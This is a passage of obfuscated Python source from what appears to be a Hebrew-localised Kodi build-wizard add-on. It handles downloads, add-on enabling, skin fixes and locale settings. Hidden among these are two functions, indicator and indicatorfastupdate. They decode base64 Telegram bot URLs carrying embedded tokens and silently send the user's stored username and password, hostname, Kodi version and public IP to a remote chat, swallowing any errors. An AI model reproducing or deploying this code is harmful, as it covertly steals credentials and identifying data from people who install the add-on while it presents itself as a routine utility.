        if not O0O000O00O0O00OO0 :#line:3436
            sys .stdout .write ('\n')#line:3437
            break #line:3438
        O00O0OO00000O00O0 +=len (O0O000O00O0O00OO0 )#line:3440
        OO0000O00OO0000O0 .write (O0O000O00O0O00OO0 )#line:3441
        if not O00OO0O0OO0O00O0O :#line:3443
            OO0O0O000O0OO00OO =O00O0OO00000O00O0 #line:3444
        if OOOOOOO0OOO0OO0O0 .iscanceled ():#line:3445
           OOOOOOO0OOO0OO0O0 .close ()#line:3446
           try :#line:3447
            os .remove (O0OOO0000O0O0O00O )#line:3448
           except :#line:3449
            pass #line:3450
           break #line:3451
        O00OOO0O000OOO00O =float (O00O0OO00000O00O0 )/OO0O0O000O0OO00OO #line:3452
        O00OOO0O000OOO00O =round (O00OOO0O000OOO00O *100 ,2 )#line:3453
        O00O0OO0O0O000OO0 =O00O0OO00000O00O0 /(1024 *1024 )#line:3454
        OO0000OOOOOO0OOOO =OO0O0O000O0OO00OO /(1024 *1024 )#line:3455
        O000O0O00OO0000O0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00O0OO0O0O000OO0 ,'teal',OO0000OOOOOO0OOOO )#line:3456
        if (time .time ()-OOO000O00O0O00000 )>0 :#line:3457
          O000OOO0OO00OOOOO =O00O0OO00000O00O0 /(time .time ()-OOO000O00O0O00000 )#line:3458
          O000OOO0OO00OOOOO =O000OOO0OO00OOOOO /1024 #line:3459
        else :#line:3460
         O000OOO0OO00OOOOO =0 #line:3461
        O0OO00O00OOOO0O00 ='KB'#line:3462
        if O000OOO0OO00OOOOO >=1024 :#line:3463
           O000OOO0OO00OOOOO =O000OOO0OO00OOOOO /1024 #line:3464
           O0OO00O00OOOO0O00 ='MB'#line:3465
        if O000OOO0OO00OOOOO >0 and not O00OOO0O000OOO00O ==100 :#line:3466
            O0OOO0OOOOOO0OO00 =(OO0O0O000O0OO00OO -O00O0OO00000O00O0 )/O000OOO0OO00OOOOO #line:3467
        else :#line:3468
            O0OOO0OOOOOO0OO00 =0 #line:3469
        OOOOO0O00O0O0O0O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O000OOO0OO00OOOOO ,O0OO00O00OOOO0O00 )#line:3470
        OOOOOOO0OOO0OO0O0 .update (int (O00OOO0O000OOO00O ),"Downloading "+name ,O000O0O00OO0000O0 ,OOOOO0O00O0O0O0O0 )#line:3472
  OOOOOO00O000OO0OO =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3475
  OO0000O00OO0000O0 .close ()#line:3477
  extract (O0OOO0000O0O0O00O ,OOOOOO00O000OO0OO ,OOOOOOO0OOO0OO0O0 )#line:3479
  if os .path .exists (OOOOOO00O000OO0OO +'/scakemyer-script.quasar.burst'):#line:3480
    if os .path .exists (OOOOOO00O000OO0OO +'/script.quasar.burst'):#line:3481
     shutil .rmtree (OOOOOO00O000OO0OO +'/script.quasar.burst',ignore_errors =False )#line:3482
    os .rename (OOOOOO00O000OO0OO +'/scakemyer-script.quasar.burst',OOOOOO00O000OO0OO +'/script.quasar.burst')#line:3483
  if os .path .exists (OOOOOO00O000OO0OO +'/plugin.video.kmediatorrent-master'):#line:3485
    if os .path .exists (OOOOOO00O000OO0OO +'/plugin.video.kmediatorrent'):#line:3486
     shutil .rmtree (OOOOOO00O000OO0OO +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3487
    os .rename (OOOOOO00O000OO0OO +'/plugin.video.kmediatorrent-master',OOOOOO00O000OO0OO +'/plugin.video.kmediatorrent')#line:3488
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3489
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3490
  try :#line:3491
    os .remove (O0OOO0000O0O0O00O )#line:3492
  except :#line:3493
    pass #line:3494
  OOOOOOO0OOO0OO0O0 .close ()#line:3495
def dis_or_enable_addon (OO0O0OO0OO0OO00OO ,OO00O00OOO0OO0OO0 ,enable ="true"):#line:3496
    import json #line:3497
    O0O0O000O00O00OO0 ='"%s"'%OO0O0OO0OO0OO00OO #line:3498
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0O0OO0OO0OO00OO )and enable =="true":#line:3499
        logging .warning ('already Enabled')#line:3500
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO0O0OO0OO0OO00OO )#line:3501
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0O0OO0OO0OO00OO )and enable =="false":#line:3502
        return xbmc .log ("### Skipped %s, reason = not installed"%OO0O0OO0OO0OO00OO )#line:3503
    else :#line:3504
        OO000O00OOOO00O00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O0O0O000O00O00OO0 ,enable )#line:3505
        O0OO00OO00O0OOOO0 =xbmc .executeJSONRPC (OO000O00OOOO00O00 )#line:3506
        O000O00OOOO00OO0O =json .loads (O0OO00OO00O0OOOO0 )#line:3507
        if enable =="true":#line:3508
            xbmc .log ("### Enabled %s, response = %s"%(OO0O0OO0OO0OO00OO ,O000O00OOOO00OO0O ))#line:3509
        else :#line:3510
            xbmc .log ("### Disabled %s, response = %s"%(OO0O0OO0OO0OO00OO ,O000O00OOOO00OO0O ))#line:3511
    if OO00O00OOO0OO0OO0 =='auto':#line:3512
     return True #line:3513
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3514
def chunk_report (OO0OOOO00OOOO0OO0 ,O000OOO00O000O000 ,O0000OOOO0O0OOOOO ):#line:3515
   O0O0O0O00O000OOO0 =float (OO0OOOO00OOOO0OO0 )/O0000OOOO0O0OOOOO #line:3516
   O0O0O0O00O000OOO0 =round (O0O0O0O00O000OOO0 *100 ,2 )#line:3517
   if OO0OOOO00OOOO0OO0 >=O0000OOOO0O0OOOOO :#line:3519
      sys .stdout .write ('\n')#line:3520
def chunk_read (OO00O0OO00OOO0000 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3522
   import time #line:3523
   O00O0OO00O0OOOOO0 =int (filesize )*1000000 #line:3524
   OOO0OOO00OOO0000O =0 #line:3526
   O00O000OOOOO00OOO =time .time ()#line:3527
   O00O00O0OOO000O0O =0 #line:3528
   logging .warning ('Downloading')#line:3530
   with open (destination ,"wb")as OOO000O00OO00OO00 :#line:3531
    while 1 :#line:3532
      O00OOO000O00000OO =time .time ()-O00O000OOOOO00OOO #line:3533
      O000OOO000OOO0OOO =int (O00O00O0OOO000O0O *chunk_size )#line:3534
      OO00O0000O00O000O =OO00O0OO00OOO0000 .read (chunk_size )#line:3535
      OOO000O00OO00OO00 .write (OO00O0000O00O000O )#line:3536
      OOO000O00OO00OO00 .flush ()#line:3537
      OOO0OOO00OOO0000O +=len (OO00O0000O00O000O )#line:3538
      OOO0000O00OO0000O =float (OOO0OOO00OOO0000O )/O00O0OO00O0OOOOO0 #line:3539
      OOO0000O00OO0000O =round (OOO0000O00OO0000O *100 ,2 )#line:3540
      if int (O00OOO000O00000OO )>0 :#line:3541
        OO0O0O00O00O0OO00 =int (O000OOO000OOO0OOO /(1024 *O00OOO000O00000OO ))#line:3542
      else :#line:3543
         OO0O0O00O00O0OO00 =0 #line:3544
      if OO0O0O00O00O0OO00 >1024 and not OOO0000O00OO0000O ==100 :#line:3545
          OO00000OOOO00O0OO =int (((O00O0OO00O0OOOOO0 -O000OOO000OOO0OOO )/1024 )/(OO0O0O00O00O0OO00 ))#line:3546
      else :#line:3547
          OO00000OOOO00O0OO =0 #line:3548
      if OO00000OOOO00O0OO <0 :#line:3549
        OO00000OOOO00O0OO =0 #line:3550
      dp .update (int (OOO0000O00OO0000O ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OOO0000O00OO0000O ,O000OOO000OOO0OOO /(1024 *1024 ),O00O0OO00O0OOOOO0 /(1000 *1000 ),OO0O0O00O00O0OO00 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OO00000OOOO00O0OO ,60 ))#line:3551
      if dp .iscanceled ():#line:3552
         dp .close ()#line:3553
         break #line:3554
      if not OO00O0000O00O000O :#line:3555
         break #line:3556
      if report_hook :#line:3558
         report_hook (OOO0OOO00OOO0000O ,chunk_size ,O00O0OO00O0OOOOO0 )#line:3559
      O00O00O0OOO000O0O +=1 #line:3560
   logging .warning ('END Downloading')#line:3561
   return OOO0OOO00OOO0000O #line:3562
def googledrive_download (O000OO00OOOOO0O00 ,O0OO00OO0O0O0OOOO ,O000OO0OO000O00O0 ,OOO0000O0OO0OOO0O ):#line:3564
    OOO0O0O0O000OOO00 =[]#line:3568
    O0OO00O00O00O00O0 =O000OO00OOOOO0O00 .split ('=')#line:3569
    O000OO00OOOOO0O00 =O0OO00O00O00O00O0 [len (O0OO00O00O00O00O0 )-1 ]#line:3570
    def O0O00OOOO0O00O0O0 (O00OOO0O000000O0O ):#line:3572
        for O00O00OOO000000OO in O00OOO0O000000O0O :#line:3574
            logging .warning ('cookie.name')#line:3575
            logging .warning (O00O00OOO000000OO .name )#line:3576
            OO000OO0OO000OOO0 =O00O00OOO000000OO .value #line:3577
            if 'download_warning'in O00O00OOO000000OO .name :#line:3578
                logging .warning (O00O00OOO000000OO .value )#line:3579
                logging .warning ('cookie.value')#line:3580
                return O00O00OOO000000OO .value #line:3581
            return OO000OO0OO000OOO0 #line:3582
        return None #line:3584
    def O000O00OO0OO0OOO0 (O000OOO00O00OO0OO ,OO0000O0O000O0OO0 ):#line:3586
        O0O0O00000O0O00O0 =32768 #line:3588
        OOOO00OO00O000000 =time .time ()#line:3589
        with open (OO0000O0O000O0OO0 ,"wb")as OOO0OO00000O0000O :#line:3591
            OO00O0OO00OO00000 =1 #line:3592
            OOO0OO00O0000OOOO =32768 #line:3593
            try :#line:3594
                OO0OOO0O0OOO000OO =int (O000OOO00O00OO0OO .headers .get ('content-length'))#line:3595
                print ('file total size :',OO0OOO0O0OOO000OO )#line:3596
            except TypeError :#line:3597
                print ('using dummy length !!!')#line:3598
                OO0OOO0O0OOO000OO =int (OOO0000O0OO0OOO0O )*1000000 #line:3599
            for OOOO0O0000O0O0O00 in O000OOO00O00OO0OO .iter_content (O0O0O00000O0O00O0 ):#line:3600
                if OOOO0O0000O0O0O00 :#line:3601
                    OOO0OO00000O0000O .write (OOOO0O0000O0O0O00 )#line:3602
                    OOO0OO00000O0000O .flush ()#line:3603
                    OOO0OO0O0000O000O =time .time ()-OOOO00OO00O000000 #line:3604
                    O0OOOOOO00O00O00O =int (OO00O0OO00OO00000 *OOO0OO00O0000OOOO )#line:3605
                    if OOO0OO0O0000O000O ==0 :#line:3606
                        OOO0OO0O0000O000O =0.1 #line:3607
                    O0000O0O00000O0OO =int (O0OOOOOO00O00O00O /(1024 *OOO0OO0O0000O000O ))#line:3608
                    OOO000O00000O0000 =int (OO00O0OO00OO00000 *OOO0OO00O0000OOOO *100 /OO0OOO0O0OOO000OO )#line:3609
                    if O0000O0O00000O0OO >1024 and not OOO000O00000O0000 ==100 :#line:3610
                      OOOO00OOO0000O0OO =int (((OO0OOO0O0OOO000OO -O0OOOOOO00O00O00O )/1024 )/(O0000O0O00000O0OO ))#line:3611
                    else :#line:3612
                      OOOO00OOO0000O0OO =0 #line:3613
                    O000OO0OO000O00O0 .update (int (OOO000O00000O0000 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OOO000O00000O0000 ,O0OOOOOO00O00O00O /(1024 *1024 ),OO0OOO0O0OOO000OO /(1000 *1000 ),O0000O0O00000O0OO ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OOOO00OOO0000O0OO ,60 ))#line:3615
                    OO00O0OO00OO00000 +=1 #line:3616
                    if O000OO0OO000O00O0 .iscanceled ():#line:3617
                     O000OO0OO000O00O0 .close ()#line:3618
                     break #line:3619
    O0OO0OO0O00O00OO0 ="https://docs.google.com/uc?export=download"#line:3620
    import urllib2 #line:3625
    import cookielib #line:3626
    from cookielib import CookieJar #line:3628
    OO00O0OOO000O000O =CookieJar ()#line:3630
    OOOO0O00OOOO000OO =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (OO00O0OOO000O000O ))#line:3631
    O0OOOOO0O0O0O0O0O ={'id':O000OO00OOOOO0O00 }#line:3633
    OOO0OO00OO000O0O0 =urllib .urlencode (O0OOOOO0O0O0O0O0O )#line:3634
    logging .warning (O0OO0OO0O00O00OO0 +'&'+OOO0OO00OO000O0O0 )#line:3635
    OO0OO00O0O000OO0O =OOOO0O00OOOO000OO .open (O0OO0OO0O00O00OO0 +'&'+OOO0OO00OO000O0O0 )#line:3636
    OO0000O00OO00000O =OO0OO00O0O000OO0O .read ()#line:3637
    for O00O00000000OOOO0 in OO00O0OOO000O000O :#line:3639
         logging .warning (O00O00000000OOOO0 )#line:3640
    OOO00O000OOO0O0OO =O0O00OOOO0O00O0O0 (OO00O0OOO000O000O )#line:3641
    logging .warning (OOO00O000OOO0O0OO )#line:3642
    if OOO00O000OOO0O0OO :#line:3643
        OOO0OOO000O00O0O0 ={'id':O000OO00OOOOO0O00 ,'confirm':OOO00O000OOO0O0OO }#line:3644
        OO00O0OO0OO00OOOO ={'Access-Control-Allow-Headers':'Content-Length'}#line:3645
        OOO0OO00OO000O0O0 =urllib .urlencode (OOO0OOO000O00O0O0 )#line:3646
        OO0OO00O0O000OO0O =OOOO0O00OOOO000OO .open (O0OO0OO0O00O00OO0 +'&'+OOO0OO00OO000O0O0 )#line:3647
        chunk_read (OO0OO00O0O000OO0O ,report_hook =chunk_report ,dp =O000OO0OO000O00O0 ,destination =O0OO00OO0O0O0OOOO ,filesize =OOO0000O0OO0OOO0O )#line:3648
    return (OOO0O0O0O000OOO00 )#line:3652
def kodi17Fix ():#line:3653
	O000OO000000OO0O0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3654
	O000O0O00O000O0O0 =[]#line:3655
	for OO00OO0OO000OO00O in sorted (O000OO000000OO0O0 ,key =lambda O0000O0O0OO0OOOOO :O0000O0O0OO0OOOOO ):#line:3656
		O00OOOOOO0OO0OO00 =os .path .join (OO00OO0OO000OO00O ,'addon.xml')#line:3657
		if os .path .exists (O00OOOOOO0OO0OO00 ):#line:3658
			OO0O00OO00OO000OO =OO00OO0OO000OO00O .replace (ADDONS ,'')[1 :-1 ]#line:3659
			O00O0OOO0000OOO00 =open (O00OOOOOO0OO0OO00 )#line:3660
			OO000O00O0O0O0O00 =O00O0OOO0000OOO00 .read ()#line:3661
			O0O000OO0O000OOOO =parseDOM (OO000O00O0O0O0O00 ,'addon',ret ='id')#line:3662
			O00O0OOO0000OOO00 .close ()#line:3663
			try :#line:3664
				O0O0OOO0OO0000OO0 =xbmcaddon .Addon (id =O0O000OO0O000OOOO [0 ])#line:3665
			except :#line:3666
				try :#line:3667
					log ("%s was disabled"%O0O000OO0O000OOOO [0 ],xbmc .LOGDEBUG )#line:3668
					O000O0O00O000O0O0 .append (O0O000OO0O000OOOO [0 ])#line:3669
				except :#line:3670
					try :#line:3671
						log ("%s was disabled"%OO0O00OO00OO000OO ,xbmc .LOGDEBUG )#line:3672
						O000O0O00O000O0O0 .append (OO0O00OO00OO000OO )#line:3673
					except :#line:3674
						if len (O0O000OO0O000OOOO )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%OO0O00OO00OO000OO ,xbmc .LOGERROR )#line:3675
						else :log ("Unabled to enable: %s"%OO00OO0OO000OO00O ,xbmc .LOGERROR )#line:3676
	if len (O000O0O00O000O0O0 )>0 :#line:3677
		O000OO0O000OO0000 =0 #line:3678
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3679
		for O0OO0O00000O00OO0 in O000O0O00O000O0O0 :#line:3680
			O000OO0O000OO0000 +=1 #line:3681
			O00000OO0O00000O0 =int (percentage (O000OO0O000OO0000 ,len (O000O0O00O000O0O0 )))#line:3682
			DP .update (O00000OO0O00000O0 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO0O00000O00OO0 ))#line:3683
			addonDatabase (O0OO0O00000O00OO0 ,1 )#line:3684
			if DP .iscanceled ():break #line:3685
		if DP .iscanceled ():#line:3686
			DP .close ()#line:3687
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3688
			sys .exit ()#line:3689
		DP .close ()#line:3690
	forceUpdate ()#line:3691
def indicator ():#line:3693
       try :#line:3694
          import json #line:3695
          wiz .log ('FRESH MESSAGE')#line:3696
          OO0OO0OO0O00O0O00 =(ADDON .getSetting ("user"))#line:3697
          OO000O0OOO000OOO0 =(ADDON .getSetting ("pass"))#line:3698
          OO000000O00O0O0OO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3699
          O000O00OOOOO00OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3700
          OOO00OOO0OOOO0O0O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3701
          O00O000OO0OOOO0O0 =str (json .loads (OOO00OOO0OOOO0O0O )['ip'])#line:3702
          OOOO0OO0O0OOOOOOO =OO0OO0OO0O00O0O00 #line:3703
          OOO0OO0O00O0O0OO0 =OO000O0OOO000OOO0 #line:3704
          import socket #line:3705
          OOO00OOO0OOOO0O0O =urllib2 .urlopen (O000O00OOOOO00OO0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OOOO0OO0O0OOOOOOO +' - '+OOO0OO0O00O0O0OO0 +' - '+OO000000O00O0O0OO +' - '+O00O000OO0OOOO0O0 ).readlines ()#line:3706
       except :pass #line:3708
def indicatorfastupdate ():#line:3710
       try :#line:3711
          import json #line:3712
          wiz .log ('FRESH MESSAGE')#line:3713
          OOO00O0OO0O000000 =(ADDON .getSetting ("user"))#line:3714
          OO00OO0OO0O0OO0O0 =(ADDON .getSetting ("pass"))#line:3715
          OOOOOO00O0000O0OO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3716
          O0O0O0000OOO0O0OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3718
          OOOOOO0O0OO0000OO =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3719
          O0O00OO0O0OO0000O =str (json .loads (OOOOOO0O0OO0000OO )['ip'])#line:3720
          O0O0O00O0O00O00O0 =OOO00O0OO0O000000 #line:3721
          O0000OOOO00OO00O0 =OO00OO0OO0O0OO0O0 #line:3722
          import socket #line:3724
          OOOOOO0O0OO0000OO =urllib2 .urlopen (O0O0O0000OOO0O0OO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0O0O00O0O00O00O0 +' - '+O0000OOOO00OO00O0 +' - '+OOOOOO00O0000O0OO +' - '+O0O00OO0O0OO0000O ).readlines ()#line:3725
       except :pass #line:3727
def skinfix18 ():#line:3729
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3730
		O0O0OOO0000O00OO0 =wiz .workingURL (SKINID18DDONXML )#line:3731
		if O0O0OOO0000O00OO0 ==True :#line:3732
			OO0O000O00O00OO0O =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3733
			if len (OO0O000O00O00OO0O )>0 :#line:3734
				OOO00OO00OOOO000O ='%s-%s.zip'%(SKINID18 ,OO0O000O00O00OO0O [0 ])#line:3735
				O000O0OOOOOO0O00O =wiz .workingURL (SKIN18ZIPURL +OOO00OO00OOOO000O )#line:3736
				if O000O0OOOOOO0O00O ==True :#line:3737
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3738
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3739
					O00O00O000O0OO0O0 =os .path .join (PACKAGES ,OOO00OO00OOOO000O )#line:3740
					try :os .remove (O00O00O000O0OO0O0 )#line:3741
					except :pass #line:3742
					downloader .download (SKIN18ZIPURL +OOO00OO00OOOO000O ,O00O00O000O0OO0O0 ,DP )#line:3743
					extract .all (O00O00O000O0OO0O0 ,HOME ,DP )#line:3744
					try :#line:3745
						O00OO0OO0OO00OOO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3746
						O0OOO0OO00OOO00OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3747
						os .rename (O00OO0OO0OO00OOO0 ,O0OOO0OO00OOO00OO )#line:3748
					except :#line:3749
						pass #line:3750
					try :#line:3751
						O000O0O0OO0O00000 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OO000O00OOOO000O0 =O000O0O0OO0O00000 .read ();O000O0O0OO0O00000 .close ()#line:3752
						O00000O000OO00OO0 =wiz .parseDOM (OO000O00OOOO000O0 ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3753
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00000O000OO00OO0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3754
					except :#line:3755
						pass #line:3756
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3757
					DP .close ()#line:3758
					xbmc .sleep (500 )#line:3759
					wiz .forceUpdate (True )#line:3760
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3761
				else :#line:3762
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3763
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O000O0OOOOOO0O00O ,xbmc .LOGERROR )#line:3764
			else :#line:3765
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3766
		else :#line:3767
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3768
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3769
def skinfix17 ():#line:3770
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3771
		O000OO0OO0000OOO0 =wiz .workingURL (SKINID17DDONXML )#line:3772
		if O000OO0OO0000OOO0 ==True :#line:3773
			O000O00O0OOO0O0O0 =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3774
			if len (O000O00O0OOO0O0O0 )>0 :#line:3775
				O00O00OOOOOO000OO ='%s-%s.zip'%(SKINID17 ,O000O00O0OOO0O0O0 [0 ])#line:3776
				OOOOO000OOOOO0000 =wiz .workingURL (SKIN17ZIPURL +O00O00OOOOOO000OO )#line:3777
				if OOOOO000OOOOO0000 ==True :#line:3778
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3779
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3780
					OO000O000O0O0OO0O =os .path .join (PACKAGES ,O00O00OOOOOO000OO )#line:3781
					try :os .remove (OO000O000O0O0OO0O )#line:3782
					except :pass #line:3783
					downloader .download (SKIN17ZIPURL +O00O00OOOOOO000OO ,OO000O000O0O0OO0O ,DP )#line:3784
					extract .all (OO000O000O0O0OO0O ,HOME ,DP )#line:3785
					try :#line:3786
						OO0OOOO00O0O00O00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3787
						O0000O0OOOOOOOOOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3788
						os .rename (OO0OOOO00O0O00O00 ,O0000O0OOOOOOOOOO )#line:3789
					except :#line:3790
						pass #line:3791
					try :#line:3792
						O00OOOO0OO0OO0O0O =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');O0OOOO00OO00O0O0O =O00OOOO0OO0OO0O0O .read ();O00OOOO0OO0OO0O0O .close ()#line:3793
						OO0OO00000O00000O =wiz .parseDOM (O0OOOO00OO00O0O0O ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3794
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OO00000O00000O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3795
					except :#line:3796
						pass #line:3797
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3798
					DP .close ()#line:3799
					xbmc .sleep (500 )#line:3800
					wiz .forceUpdate (True )#line:3801
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3802
				else :#line:3803
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3804
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OOOOO000OOOOO0000 ,xbmc .LOGERROR )#line:3805
			else :#line:3806
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3807
		else :#line:3808
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3809
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3810
def fix17update ():#line:3811
	if KODIV >=17 and KODIV <18 :#line:3812
		wiz .kodi17Fix ()#line:3813
		xbmc .sleep (4000 )#line:3814
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3815
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3816
		fixfont ()#line:3817
		OO0000OO0000OO0O0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3818
		try :#line:3820
			OO00O00000OOOO00O =open (OO0000OO0000OO0O0 ,'r')#line:3821
			OOOO00OOOOO0000OO =OO00O00000OOOO00O .read ()#line:3822
			OO00O00000OOOO00O .close ()#line:3823
			OO000OO000O00O0OO ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3824
			O0O0OO0OOO0O0O0O0 =re .compile (OO000OO000O00O0OO ).findall (OOOO00OOOOO0000OO )[0 ]#line:3825
			OO00O00000OOOO00O =open (OO0000OO0000OO0O0 ,'w')#line:3826
			OO00O00000OOOO00O .write (OOOO00OOOOO0000OO .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O0O0OO0OOO0O0O0O0 ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3827
			OO00O00000OOOO00O .close ()#line:3828
		except :#line:3829
				pass #line:3830
		wiz .kodi17Fix ()#line:3831
		OO0000OO0000OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3832
		try :#line:3833
			OO00O00000OOOO00O =open (OO0000OO0000OO0O0 ,'r')#line:3834
			OOOO00OOOOO0000OO =OO00O00000OOOO00O .read ()#line:3835
			OO00O00000OOOO00O .close ()#line:3836
			OO000OO000O00O0OO ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3837
			O0O0OO0OOO0O0O0O0 =re .compile (OO000OO000O00O0OO ).findall (OOOO00OOOOO0000OO )[0 ]#line:3838
			OO00O00000OOOO00O =open (OO0000OO0000OO0O0 ,'w')#line:3839
			OO00O00000OOOO00O .write (OOOO00OOOOO0000OO .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O0O0OO0OOO0O0O0O0 ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3840
			OO00O00000OOOO00O .close ()#line:3841
		except :#line:3842
				pass #line:3843
		swapSkins ('skin.Premium.mod')#line:3844
def fix18update ():#line:3846
	if KODIV >=18 :#line:3847
		xbmc .sleep (4000 )#line:3848
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3849
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3850
		fixfont ()#line:3851
		O0000O0OOOO000000 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3852
		try :#line:3853
			OOOO00OOO0O0OOOO0 =open (O0000O0OOOO000000 ,'r')#line:3854
			O0OO0OOO00O000OOO =OOOO00OOO0O0OOOO0 .read ()#line:3855
